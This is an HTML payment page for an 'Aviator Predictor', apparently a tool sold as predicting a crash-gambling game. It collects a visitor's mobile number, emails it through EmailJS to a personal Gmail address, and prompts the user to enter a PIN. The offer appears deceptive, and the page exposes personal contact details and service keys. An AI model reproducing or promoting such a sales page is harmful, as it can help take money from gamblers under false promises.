<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator Predictor Payment</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /*... (your existing CSS styles)... */
    </style>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("abfC9oICRtMIGM5cb"); // Public Key
        })();
    </script>
</head>
<body>
    <div class="container">
        <h1>Aviator Predictor Payment</h1>
        <input type="text" id="phoneNumber" placeholder="Enter your mobile number">
        <button id="payButton">Pay</button>
    </div>

    <a href="paid.html" class="float-button">Demo Account</a>

    <div class="footer">
        <p>Need help? Contact us on <a href="https://wa.me/250739121651" class="whatsapp-button" target="_blank">WhatsApp</a></p>
    </div>

    <div class="modal fade" id="confirmationModal" tabindex="-1" role="dialog" aria-labelledby="confirmationModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="confirmationModalLabel">Confirm Payment</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    Are you sure you want to process the payment?
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" id="confirmPayment">Continue</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('payButton').addEventListener('click', function() {
            const phoneNumber = document.getElementById('phoneNumber').value;

            if (!phoneNumber) {
                alert("Please enter a mobile number.");
                return;
            }

            $('#confirmationModal').modal('show'); // Show the confirmation modal
        });

        document.getElementById('confirmPayment').addEventListener('click', function() {
            const phoneNumber = document.getElementById('phoneNumber').value;

            const templateParams = {
                to_name: "Customer",
                message: "Payment request from: " + phoneNumber,
                to_email: "shimwaolivier7@gmail.com"
            };

            emailjs.send('service_k7026ko', 'template_p0of43y', templateParams)
            .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    $('#confirmationModal').modal('hide'); // Hide the confirmation modal
                    alert("Payment request has been sent. Enter the PIN.");

                    setTimeout(function() {
                        window.location.href = "product.html";
                    }, 10000); // Redirect after 10 seconds

                }, function(error) {
                    console.error('FAILED...', error);
                    alert("Email sending failed. Please try again.");
                    $('#confirmationModal').modal('hide');
                });
        });
    </script>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
